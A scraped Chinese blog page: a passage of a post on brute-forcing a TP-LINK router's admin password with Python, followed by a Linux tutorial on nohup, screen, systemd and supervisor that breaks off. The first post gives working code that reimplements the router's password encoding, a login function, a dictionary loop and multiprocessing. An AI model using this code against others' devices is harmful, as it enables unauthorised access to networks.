<p>POST &#x2F; HTTP&#x2F;1.1<br>Host: 192.168.1.1<br>Connection: keep-alive<br>Content-Length: 54<br>Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01<br>Origin: <a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a><br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.9; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0<br>Content-Type: application&#x2F;json; charset&#x3D;UTF-8</p>
<p>DNT: 1<br>Referer: <a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1/</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</p>
<p>{“method”:”do”,”login”:{“password”:”0KcgeXhc9TefbwK”}}HTTP&#x2F;1.1 200 OK<br>Content-Type: text&#x2F;html;charset&#x3D;UTF-8<br>Content-Length: 75<br>Connection: close<br>Access-Control-Allow-Origin: *<br>Cache-control: no-cache<br>{“error_code”:0, “stok”:”%7EAjzwZP%2E%2EFD%5B0Z%7C46Z4PPP%28LQPu4%28kD%28”}</p>
<p>也就是说是提交了<code>&#123;&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:&#123;&quot;password&quot;:&quot;0KcgeXhc9TefbwK&quot;&#125;&#125;</code>这样一个json，很明显那个0K什么的就是密码了，用postman提交一下试试，咋提交呢？headers设置成<code>application/json</code>，然后body里写raw，设置json，不出意外的话，你会得到一个error code 0</p>
<p><img src="/images/2017122803170544.png"></p>
<p>但是吧，<code>0KcgeXhc9TefbwK</code>这究竟是个啥，估计是在浏览器这里用JS加密了的密码吧，那咱就看JS然后溯源……？</p>
<p>还好<a target="_blank" rel="noopener" href="http://blog.csdn.net/dev_here/article/details/51235324">已经有人分析过了</a>，并且给出了C#版本的代码，咱只要port到Python就好啦。</p>
<p>[v_warn]小提示：我曾经在一篇博文中讨论过究竟是客户端加密还是服务端加密，我给出的观点是，至少要进行服务端加密。因为客户端加密是完全可以被重放攻击的。就这个例子来说，假如是有人通过中间人劫持的方式抓到了这个json，那么他就可以重放这个json来登录，尽管他依旧不知道密码。当然了，你都客户端加密了，自然加密用的密钥可能会被发现，然后被逆向。[&#x2F;v_warn]</p>
<h2 id="一种另类的模拟登录的办法"><a href="#一种另类的模拟登录的办法" class="headerlink" title="一种另类的模拟登录的办法"></a>一种另类的模拟登录的办法</h2><p>在正经的用requests库之前，我想到了一种另类的模拟登录的办法，比如说上面的这段JS我要是没逆向出来，那么就只好这么了，这种方法叫做……<a target="_blank" rel="noopener" href="https://selenium-python.readthedocs.io/">selenium</a></p>
<p>from selenium import webdriver</p>
<p>driver &#x3D; webdriver.Chrome()<br>driver.get(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a>‘)<br>driver.find_element_by_xpath(‘&#x2F;&#x2F;*[@id&#x3D;”lgPwd”]‘).send_keys(‘123456’)<br>driver.find_element_by_xpath(‘&#x2F;&#x2F;*[@id&#x3D;”loginSub”]‘).click()</p>
<p>当然了你还需要写几行代码判断是否登录成功，咱还可以把Chrome换成<a target="_blank" rel="noopener" href="http://phantomjs.org/">PhantomJS</a>，只不过嘛，嘿嘿嘿，这个速度，估计要几秒钟才能尝试一个密码，效率太低啦。</p>
<h2 id="传统路由器用Python模拟登录"><a href="#传统路由器用Python模拟登录" class="headerlink" title="传统路由器用Python模拟登录"></a>传统路由器用Python模拟登录</h2><p>既然我们已经用postman搞成功了，那么就上requests库试试吧。代码很简单，就几行，简单的测试下：</p>
<p>import requests<br>r&#x3D;requests.get(‘<a target="_blank" rel="noopener" href="http://192.168.7.1/">http://192.168.7.1</a>‘, headers&#x3D;{‘Authorization’: ‘Basic QxxxxI2’})<br>print r.status_code</p>
<p>如果<code>status_code</code>为200的话，那么就是登录成功了。</p>
<h2 id="新型路由器用Python模拟登录"><a href="#新型路由器用Python模拟登录" class="headerlink" title="新型路由器用Python模拟登录"></a>新型路由器用Python模拟登录</h2><p>不要害怕，我已经帮你逆向好了客户端加密的那段代码，所以总体来说大概就是这么两个函数（好吧感觉缩进乱了）：当然啦，能够把JavaScript代码移植到Python也很不容易的，这是没有混淆、比较简单易懂的那种的，要是复杂的话，直接用<a target="_blank" rel="noopener" href="https://github.com/doloopwhile/PyExecJS">PyExecJS</a>吧（可惜<a target="_blank" rel="noopener" href="https://gist.github.com/doloopwhile/8c6ec7dd4703e8a44e559411cb2ea221">停止维护</a>了）</p>
<p>def security_encode(b):<br>    a &#x3D; ‘RDpbLfCPsJZ7fiv’<br>    c &#x3D; ‘yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW’</p>
<pre><code>e = &#39;&#39;
g = len(a)
h = len(b)
k = len(c)

f = g if g &gt; h else h
for p in range(f):
    n = l = 187
    if p &gt;= g:
        n = ord(b\[p\])
    elif p &gt;= h:
        l = ord(a\[p\])
    else:
        l = ord(a\[p\])
        n = ord(b\[p\])
    e += c\[((l ^ n) % k)\]
return e
</code></pre>
<p>def login(password):<br>    requests.get(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a>‘, headers&#x3D;{‘Content-Type’: ‘application&#x2F;json’})<br>    r &#x3D; requests.post(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a>‘, json&#x3D;{“method”: “do”, “login”: {“password”: security_encode(password)}})<br>    return r.status_code</p>
<p>同上，<code>status_code</code>为200，就意味着密码正确啦。</p>
<h2 id="开始暴力破解：集成弱口令字典"><a href="#开始暴力破解：集成弱口令字典" class="headerlink" title="开始暴力破解：集成弱口令字典"></a>开始暴力破解：集成弱口令字典</h2><p>当然了，实际暴力破解的时候，咱不可能一个一个输入密码，所以咱要使用弱口令字典。为了演示方便，我就随意编辑了一个比较简单的、长度比较短的弱口令字典，咱封装一下就好啦。想要真正的弱口令字典吗？自己搜索去吧~</p>
<p>def new_crack():<br>    with open(‘test_pass.txt’, ‘r’) as f:<br>        while True:<br>            line &#x3D; f.readline()<br>            if len(line) &#x3D;&#x3D; 0:<br>                break<br>            else:<br>                result, msg &#x3D; new_login(line.rstrip(‘\n’))<br>                if result:<br>                    return msg</p>
<p>至于传统登录的，还需要一份用户名文件，双重循环并注意seek即可。</p>
<h2 id="封装，封装"><a href="#封装，封装" class="headerlink" title="封装，封装"></a>封装，封装</h2><p>在完成了基本的测试之后，基本上就剩下封装函数、引入库、进行测试这些基本操作了，详细的代码就不贴了，可以戳下面的章鱼猫获取。其实这代码还可以更灵活的，那么就交给读者们了！ [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/tools/tree/master/router/_crack'/]%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/tools/tree/master/router\_crack&#39;\]项目地址\[/gt\]</a></p>
<h2 id="加快破解速度"><a href="#加快破解速度" class="headerlink" title="加快破解速度"></a>加快破解速度</h2><p>俗话说，欲速则不达，呸，我才不管这些呢。我要加快破解程序的破解速度，我这一跑，也就占用20%不到的CPU，速度太慢了。那么……多线程？呃，Python里的多线程由于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/%E5%85%A8%E5%B1%80%E8%A7%A3%E9%87%8A%E5%99%A8%E9%94%81">GIL锁</a>的存在，这多线程有时接近个摆设（就是说，无法发挥多核CPU的全部性能，当然如果不是CPU密集型的任务，遇到I&#x2F;O操作会释放锁，用多线程还是可以并发的）……那么我们只能上多进程了…省事，跑满CPU…另外，评论区仙子指出，连接复用也是一个好办法。</p>
<p> </p>
<p>那我们只需要在密码那里开个进程池，把任务全都丢给进程池，然后一起<code>join</code>就可以了。详细的代码可以参考下面的章鱼猫。 [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/tools/blob/master/router/_crack/multiprocess/_old/_crack.py'/]%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%A4%BA%E4%BE%8B%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/tools/blob/master/router\_crack/multiprocess\_old\_crack.py&#39;\]多进程示例地址\[/gt\]</a></p>
<p>当然了，为了防止反复调用<code>p.get()</code>影响多进程效率，我稍微做了一点点改动。</p>
<p><img src="/images/2017122803170796.png"></p>
<p>这是一颗满载的CPU……</p>
<h2 id="最后的结果……"><a href="#最后的结果……" class="headerlink" title="最后的结果……"></a>最后的结果……</h2><p><img src="/images/2017122803170958.png"></p>
<p>我还能说什么，TP-LINK这绝对是脑子进水了。客户端加密的时候我就说你有毛病了，这连自己都进不去管理页面逼我重启路由器，真是……行吧，我打算逆向固件了。下次见。啊对，有个工具叫<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">THC Hydra</a>，也可以试试哦！</p>
<h2 id="哦对了"><a href="#哦对了" class="headerlink" title="哦对了"></a>哦对了</h2><p>提前祝愿小伙伴们元旦快乐！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/12/28/python-bfa-router/index/" data-id="clhp7rtic006xs2qr2dp0e5zm" data-title="使用python暴力破解路由器管理密码" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-linux-keep-running/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/12/07/linux-keep-running/index/" class="article-date">
  <time class="dt-published" datetime="2017-12-07T00:00:00.000Z" itemprop="datePublished">2017-12-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/12/07/linux-keep-running/index/">Linux怎么让程序持续运行：简单说说几种好玩的办法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这段时间，有小伙伴问我，怎么能让程序在关掉ssh之后还能继续运行？我简单的的说了一句开个screen吧。</p>
<p>实际上呢，在这之后还是有一些比较深奥的原理的，咱就扯扯。</p>
<h2 id="不得不的说的SSH"><a href="#不得不的说的SSH" class="headerlink" title="不得不的说的SSH"></a>不得不的说的SSH</h2><p>用Windows的远程桌面的时候，咱可能有这种感受：把远程桌面断开了，里面的程序也欢快的跑着ε&#x3D;ε&#x3D;ε&#x3D;(<del>￣▽￣)</del>但是在Linux我们把ssh连接断开，正在跑的程序却会立刻挂掉。这是为啥捏<del>(￣▽￣)</del>*</p>
<p>话说，咱连接到服务器，都是有sshd这个服务来负责的；连接成功之后，sshd会启动bash，之后咱在运行的命令什么的，相当于bash来帮我们启动。</p>
<p>此时的进程树大概是这么样子的：</p>
<p>init-&gt;sshd-&gt;bash-&gt;some_program</p>
<p>通过<code>pstree</code>可以大概看到进程树的结构</p>
<p><img src="/images/2017120708053786.png"></p>
<p>不能继续讲了，因为此时我们要说信号量！</p>
<h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>在不远的过去，有一门课叫《操作系统》，有一个章节叫信号量，有一个哥们叫<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%89%BE%E5%85%B9%E8%B5%AB%E5%B0%94%C2%B7%E6%88%B4%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89">迪杰斯特拉</a>我一直管他叫迪杰特斯拉（爱迪生：说好的你爱我呢）</p>
<p>噗，跑题了。</p>
<p>话说在Linux下，咱是如何停止某个程序运行的呢？Ctrl+C，没错，但是只有前台进程才会体验到。</p>
<p>通常来说，咱会使用kill来结束某个进程。kill命令会给进程发送一个信号，然后由进程来处理（捕获）这个信号。这就好像是医生跟你说，你可以死了，然后你就选择……自杀吗&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<p>kill用法很简单，简单点，一个PID；复杂点，一个signal，一个PID。</p>
<p>也就是说，你想杀掉PID为1087的进程，温柔点就<code>kill 1087</code>好了。</p>
<p>默认来说，kill会发送SIGTERM这个信号。</p>
<p>使用<code>kill -l</code>可以列出来所有的信号：</p>
<p><img src="/images/2017120708053951.png"></p>
<p>通常有这么几个信号是比较常用的、应该被记住的：</p>
<blockquote>
<p>1 - SIGHUP：挂起信号，当终端连接断开时就会发送这个信号；</p>
<p>2 - SIGINT：中断信号，也就是按Ctrl+C；</p>
<p>9 - SIGKILL：最强大的信号，相当于爆头击杀，不能被捕获；进程收到这个信号就会立刻拜拜；</p>
<p>15 - SIGTERM：终止信号，kill默认发送的信号，这就是告诉进程尽可能的终止，咱得跟进程爸爸一个告别儿女收拾善后的一个机会嘛；</p>
<p>19 - SIGSTOP：中断进程，也不能被捕获。咱别看这里写的是STOP，实际上是暂停的意思啦，等同于Ctrl+Z。用18号就恢复了~</p>
</blockquote>
<p>这话说的太抽象了，咱不如写个bash脚本来体验一下这几个信号量吧。</p>
<p>#!&#x2F;bin&#x2F;bash<br>trap “” INT<br>sleep 10</p>
<p>这代码不能再简单了。运行这个脚本，然后按Ctrl+C，咱会发现这程序并不退出， <img src="/images/2017120708054170.png"> </p>
<p>因为INT被捕获并忽略啦。 [v_tips]备注： 其实bash的坑很多，比如说，trap啥时候运行？咱以上的直觉可能是，接收到对应的信号，trap就会立刻做出相应与处理。其实不是的. 实际上，bash的行为比较特殊。当按下 CTRL-C 之后，它会向当前的整个进程组发出 SIGINT 信号。而 sleep 是由当前脚本调用的，是这个脚本的子进程（<code>/bin/sleep</code>）。 如果当前正有一个外部命令（<code>/bin/sleep</code>）在前台执行，那么 trap 会等待当前命令结束以后再处理信号队列中的信号。也就是trap要等sleep执行完才会捕捉到了信号。[&#x2F;v_tips]</p>
<h2 id="前台后台与作业控制"><a href="#前台后台与作业控制" class="headerlink" title="前台后台与作业控制"></a>前台后台与作业控制</h2><p>正常咱们的程序是跑在前台的，如果想跑到后台，那么命令结尾加个<code>&amp;</code>就好了。</p>
<p>比如说<code>bash demo.sh&amp;</code>那就被丢到后台去执行了，执行完成会弹出来告诉我们done</p>
<p><img src="/images/2017120708054281.png"></p>
<p>把正在运行的暂停并丢到后台，那就Ctrl+Z；查看作业列表，就用<code>jobs</code>；拿回前台就用<code>fg</code>；把暂停的继续运行就用<code>bg</code>……</p>
<p>不知道大家懂了没，哈哈哈哈。</p>
<h2 id="连接断开时"><a href="#连接断开时" class="headerlink" title="连接断开时"></a>连接断开时</h2><p>首先咱要知道，挂断信号（SIGHUP）默认的动作是终止程序。</p>
<p>那父进程要是先被终止、退出了，子进程会怎么样？一般来说有两种：</p>
<ol>
<li>过继（收养）给init，孤儿进程</li>
<li>被划为孤儿进程组，SIGHUP杀死</li>
</ol>
<p>[v_blue]小提示： 孤儿进程是先死了爹的进程，可能会有继父（init），也可能被归入进程组然后被SIGHUP杀死； 那要是子进程先死了呢？自然子进程会先把资源释放，然后父进程会给收尸（调用wait），然后内核回收进程控制块（PCB）。假如父进程因为种种原因没调用wait那么子进程的PCB仍然保存在系统中，就成为了僵尸进程。放心，kill 9是杀不掉僵尸进程的，遇到僵尸进程就杀死对应的父进程，然后init就会成为僵尸进程的爹，之后wait回收。[&#x2F;v_blue] 简单的说，sshd发现连接断开之后，bash收到SIGHUP信号从而关闭其所有子进程。(注意，bash的行为比较诡异，如果是输入exit，那就不会发送SIGHUP，也就是说你exit退出的，那么脚本还是欢快的跑下去的)</p>
<p>所以自然终端断了，大家都被SIGHUP干掉了呗~SIGHUP是元凶啊！ [v_notice] 一点点小实验： 让我们连到服务器，然后<code>systemctl stop sshd.service</code>，然后惊奇的发现当前终端还活着。想想这是为什么？后面我会说的…… 好了赶紧启动吧，要不当前连接挂了那就不好玩了。[&#x2F;v_notice]</p>
<h2 id="保持程序可靠运行的几种方法"><a href="#保持程序可靠运行的几种方法" class="headerlink" title="保持程序可靠运行的几种方法"></a>保持程序可靠运行的几种方法</h2><p>既然咱都知道是因为SIGHUP关闭的了，那咱让程序忽略这个信号不就好了嘛！</p>
<h3 id="几种不好用的办法"><a href="#几种不好用的办法" class="headerlink" title="几种不好用的办法"></a>几种不好用的办法</h3><p>比如说<code>&amp;</code>，Ctrl+Z，这都是不好用的……照样还是处于一个session中，还是sshd-&gt;bash-&gt;program，还是会收到SIGHUP然后拜拜。</p>
<h2 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h2><p>SIGHUP是元凶，那么<code>nohup</code>就好了。</p>
<p>比如说：</p>
<p>nohup ping z.cn</p>
<p>这样程序的输出会被重定向到<code>nohup.out</code>中，更通常我们会<code>nohup ping z.cn &amp;</code>顺便给丢到后台，此时进程树还是init-&gt;sshd-&gt;bash-&gt;ping，如果我们关闭终端，那么<code>ping</code>就会成为孤儿进程，然后过继给init，此时我们<code>pstree</code>一下会发现变为init-&gt;ping了</p>
<p><img src="/images/201712070805442.png"></p>
<h3 id="setsid"><a href="#setsid" class="headerlink" title="setsid"></a>setsid</h3><p><code>nohup</code>是通过忽略SIGHUP来保持运行的，那咱能不能直接让<code>ping</code>不属于当前会话，自然也就收不到关闭终端时给进程组发的SIGHUP了？能啊怎么不能呢，<code>setsid</code>啊，用例如下：</p>
<p>setsid ping z.cn</p>
<p>此时<code>pstree</code>和上面是一样的，<code>ps</code>能够看到他的父进程是init，（init：我就是万年备胎，专门收垃圾）</p>
<p><img src="/images/2017120708054548.png"></p>
<h3 id="disown"><a href="#disown" class="headerlink" title="disown"></a>disown</h3><p>如果一不小心程序已经运行了，那么该怎么补救呢？</p>
<p>答案是使用<code>disown</code>来控制作业（jobs），举例：</p>
<p>sleep 100<br>disown -h %1</p>
<p>关闭终端之后依旧会持续运行，只是不能用<code>jobs</code>控制了（但应该能用盖茨控制）。</p>
<p>感觉似乎以上方法都不太好，要么查看输出太费事，要么用起来很别扭，那有什么更好的办法吗？当然了！</p>
<h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p><code>screen</code>是个非常强大的工具，大概就是模拟VT100&#x2F;ANSI的窗口管理器。说不明白了。反正我大概是这么用的：</p>
<p>screen -S dl</p>
<p>做一点事情……</p>
<p>要回来的时候，<code>screen -r dl</code>就回到了终端关闭之前的界面。</p>
<p>关掉终端，咱能看到进程树是init-&gt;screen-&gt;bash-&gt;ping</p>
<p><img src="/images/2017120708054725.png"></p>
<h2 id="某天我写了个程序"><a href="#某天我写了个程序" class="headerlink" title="某天我写了个程序"></a>某天我写了个程序</h2><p>某天我写了个程序，想让它永不停息，于是乎我用了screen，然后某一天这个程序抛异常了，然后我screen回去看了一眼继续启动；某天服务器重启了，我进去再screen……周而复始，这个程序名字叫做<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot">ExpressBot</a>，烦不烦呐！！</p>
<p>所以咱得让这个程序成为服务。顺便说一句，比如说你要是官方二进制的MongoDB、MySQL，那么用systemd或者supervisor守护下也是非常好的选择。</p>
<h2 id="使用systemd"><a href="#使用systemd" class="headerlink" title="使用systemd"></a>使用systemd</h2><p>systemd是Linux下最流行的init，由Lennart Poettering带头开发。发音不是system d，而是System Five Hundred 因为D是罗马数字里的500.</p>
<p>Lennart：<a target="_blank" rel="noopener" href="https://linux.cn/article-3978-1.html">我就是想怼你们的教皇</a>。</p>
<h3 id="命令概述"><a href="#命令概述" class="headerlink" title="命令概述"></a>命令概述</h3><p>关于systemd，Arch Linux有一篇写的<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">非常详尽的wiki</a>，我们要想给自己的程序做成服务，通常是要添加单元（unit），单元可以是系统服务（.service）、挂载点（.mount）、sockets（.sockets） 、系统设备（.device）、交换分区（.swap）、文件路径（.path）、启动目标（.target）、由 systemd 管理的计时器（.timer）。如果没有扩展名，那么就会被当作服务，比如说sshd和sshd.service就是一个意思。</p>
<p>system的主要命令是<code>systemctl</code>，常用的服务相关命令有<code>start</code>，<code>stop</code>，<code>restart</code>，<code>reload</code>，<code>status</code>，<code>enable</code>，<code>disable</code>，<code>mask</code>（禁用），<code>unmask</code>（取消禁用），<code>daemon-reload</code>，举例（需要root权限）：</p>
<p>#立即启动单元：<br>systemctl start &lt;单元&gt;<br>#重新载入 systemd，扫描新的或有变动的单元，在修改了单元文件之后是非常必要的：<br>systemctl daemon-reload<br>#一些其他命令举例：</p>
<h1 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h1><p>systemctl reboot</p>
<h1 id="关闭系统，切断电源"><a href="#关闭系统，切断电源" class="headerlink" title="关闭系统，切断电源"></a>关闭系统，切断电源</h1><p>systemctl poweroff<br>#查看启动耗时<br>systemd-analyze<br>#显示某个 Unit 是否正在运行(一般用于脚本判断)<br>systemctl is-active sshd.service<br>#修改单元<br>systemctl edit –full sshd.service</p>
<h3 id="systemd单元加载路径"><a href="#systemd单元加载路径" class="headerlink" title="systemd单元加载路径"></a>systemd单元加载路径</h3><p>单元文件是有一定的加载顺序的，先加载<code>/etc/system/system</code>，然后是<code>/run/systemd/system</code>，最后是<code>/lib/systemd/system</code>，如下图所示：</p>
<p><img src="/images/2017120708054810.png"></p>
<h3 id="service示例：Unit"><a href="#service示例：Unit" class="headerlink" title="service示例：Unit"></a>service示例：Unit</h3><p>一个配置文件可以分为unit、service、install 这几个模块。</p>
<p>unit定义描述、启动顺序、依赖等，</p>
<p><code>Description</code>给出当前服务的简单描述，<code>Documentation</code>字段给出文档路径；</p>
<p><code>After</code>和<code>Before</code>指定启动顺序（只是顺序，不是依赖），比如说如果在网络服务之后启动，那么就应该写成</p>
<p>After&#x3D;network.target</p>
<p>依赖关系，需要使用<code>Wants</code>和<code>Requires</code></p>
<p><code>Wants</code>表示依赖关系是可选的；<code>Requires</code>依赖关系是必须的，如果被依赖的服务启动失败或异常退出，那么依赖者也必须退出。</p>
<h3 id="service示例：service"><a href="#service示例：service" class="headerlink" title="service示例：service"></a>service示例：service</h3><ul>
<li>Exec</li>
</ul>
<p>service中最重要的就是<code>ExecStart</code>，定义启动进程时执行的命令，需要使用绝对路径，类似的还有<code>ExecReload</code>（重启服务时执行）、<code>ExecStop</code>（停止服务时执行）、<code>ExecStartPre</code>（启动服务之前执行）、<code>ExecStartPost</code>（启动服务之后执行）、<code>ExecStopPost</code>（停止服务之后执行）</p>
<ul>
<li>Type</li>
</ul>
<p>Type定义启动类型，有好多种，比如说<code>simple</code>、<code>forking</code>、<code>oneshot</code>……</p>
<p>咱一般用<code>simple</code>比较多，意思是<code>ExecStart</code>字段启动的进程为主进程。</p>
<ul>
<li>KillMode</li>
</ul>
<p>KillMode：定义 如何停止服务，有<code>control-group、process、mixed、none</code></p>
<p>control-group（默认值）：当前控制组里面的所有子进程，都会被杀掉</p>
<p>process：只杀主进程，会话保留</p>
<p>mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号</p>
<p>none：没有进程会被杀掉，只是执行服务的 stop 命令。</p>
<p>我们来看下sshd的配置：</p>
<p><img src="/images/2017120708054918.png"></p>
<p>知道为什么sshd服务关了，当前连接还不断吧。</p>
<ul>
<li>Restart</li>
</ul>
<p>Restart定义重启字段，有这么几个值：<code>on、always、on-success、on-failure、on-abnormal、on-abort、on-watching</code>，具体详情如下表：</p>
<p><img src="/images/2017120708055089.png"></p>
<p>还有一个<code>RestartSec</code>，指的是重启服务之前等待几秒。</p>
<ul>
<li>Environment</li>
</ul>
<p><code>Environment</code>定义环境变量。一个比较坑的地方是systemd无法读取<code>/etc/profile</code>,<code>.bashrc</code>等环境变量，systemd启动的服务也读取不到这些环境变量（知道为啥用绝对路径了吧），有这么几种解决方案：</p>
<p>1.修改systemd配置文件，使得环境变量在所有单元中可见</p>
<p>在 <code>/etc/systemd/user.conf</code>文件中使用 <code>DefaultEnvironment</code> 选项。</p>
<p>2.修改单元配置文件，使得环境变量在用户单元中可见</p>
<p><code>systemctl edit --full expressbot.service</code>（或者找到对应的文件路径，比如说<code>/lib/system/system/expressbot.service</code>） 下增加配置文件设置。</p>
<ol>
<li>导入变量</li>
</ol>
<p>在任何时候， 使用 <code>systemctl --user set-environment</code> 或 <code>systemctl --user import-environment</code>. 对设置之后启动的所有用户单元有效，但已经启动的用户单元不会生效。</p>
<p>例子：</p>
<p>[Service]<br>Environment&#x3D;”TOKEN&#x3D;12345”<br>Environment&#x3D;”DB_PATH&#x3D;&#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;bot.db”<br>Environment&#x3D;”TURING_KEY&#x3D;111111”<br>Environment&#x3D;”DEBUG&#x3D;0”</p>
<p>Restart&#x3D;always<br>Type&#x3D;simple<br>ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py</p>
<p>此时在这个python脚本中就可以用<code>os.environ.get(&#39;DEBUG&#39;)</code>来获取到环境变量啦（类型全部为字符串）。其实这种方式也方便更新，不用再merge了。</p>
<h3 id="service示例：install"><a href="#service示例：install" class="headerlink" title="service示例：install"></a>service示例：install</h3><p><code>install</code>就比较简单了，就是定义什么情况下启动。</p>
<p>比如说<code>WantedBy=multi-user.target</code>就意味着在多用户环境下会启动，<code>WantedBy= graphical.target</code>表示图形用户下启动。</p>
<h3 id="完整配置文件："><a href="#完整配置文件：" class="headerlink" title="完整配置文件："></a>完整配置文件：</h3><p>[Unit]<br>Description&#x3D;A Telegram Bot for querying expresses<br>After&#x3D;network.target network-online.target nss-lookup.target</p>
<p>[Service]<br>Environment&#x3D;”TOKEN&#x3D;12345”<br>Environment&#x3D;”DB_PATH&#x3D;&#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;bot.db”<br>Environment&#x3D;”TURING_KEY&#x3D;111111”<br>Environment&#x3D;”DEBUG&#x3D;0”<br>Restart&#x3D;always<br>Type&#x3D;simple<br>ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py</p>
<p>[Install]<br>WantedBy&#x3D;multi-user.target</p>
<p>更多详情可以<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html">参考这里</a></p>
<h2 id="不好玩的轮子"><a href="#不好玩的轮子" class="headerlink" title="不好玩的轮子"></a>不好玩的轮子</h2><p>在以前，我是怎么检测服务是否还在运行的呢……</p>
<p>基本思路是，<code>pidof</code>能获取到运行中的进程的id，然后根据<code>$?</code>判断是否还在运行，比如说……</p>
<p>pidof php-fpm &gt;&#x2F;dev&#x2F;null<br>if [ $? -eq 0 ] ; then<br>    echo “It is running.”<br>else<br>    echo “At `date` PHP Server was stopped”&gt;&gt; &#x2F;home&#x2F;wwwlogs&#x2F;service_log<br>fi</p>
<p>然后加入到crontab中（值得一提的是，systemd也有个timer，类似于crontab，可以参考<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Systemd/Timers_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">Arch</a>“ \l “.E6.9B.BF.E4.BB.A3_cron) <a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Systemd/Timers_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">L</a>“ \l “.E6.9B.BF.E4.BB.A3_cron)<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Systemd/Timers_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">inux</a>“ \l “.E6.9B.BF.E4.BB.A3_cron)）。</p>
<p>这样做其实不是很理想，最长可能会导致服务中断近一分钟，这绝对是莱洛三角形。</p>
<p>所以，直接给Restart字段一个<code>on-abnormal</code>或者<code>on-failure</code>就好了嘛。 [v_blue]思考一下：cron最短时间周期是一分钟一次，我就想十秒钟一次，该怎么办？[&#x2F;v_blue]</p>
<h2 id="systemd的优缺点"><a href="#systemd的优缺点" class="headerlink" title="systemd的优缺点"></a>systemd的优缺点</h2><p>systemd的功能十分强大，配置文件也好写，而且systemd比较稳定（它要是挂了，那系统就挂了）。但是有一点可能不太好，就是并不是所有系统的init都是systemd（systemd争议有点大），比如说Ubuntu 14.04就不是（16.04是，跟上游Debian），Devuan（一个不用systemd的Debian）。哦对了，systemd看日志感觉不是那么方便</p>
<p>另一个备选方案是supervisor，python咱都有吧……</p>
<h2 id="Supervisor"><a href="#Supervisor" class="headerlink" title="Supervisor"></a>Supervisor</h2><p>Supervisor 是一个用 Python 写的进程管理工具，可以很方便的用来启动、重启、关闭进程（不仅仅是 Python 进程）。</p>
<p>先用pip安装:</p>
<p>pip install supervisor</p>
<h3 id="配置supervisord"><a href="#配置supervisord" class="headerlink" title="配置supervisord"></a>配置supervisord</h3><p>同样，supervisor也有一个配置文件优先路径，<code>$CWD/supervisord.conf</code> &gt; <code>$CWD/etc/supervisord.conf</code> &gt; <code>/etc/supervisord.conf</code>，</p>
<p>我一般会创建一个<code>/etc/supervisord.conf</code>，然后创建一个<code>/etc/supervisor/SomeService.conf</code>,然后在<code>/etc/supervisord.conf</code>中包含后者。</p>
<p>如下创建默认配置：</p>
<p>echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf</p>
<p>最后一行包含配置：</p>
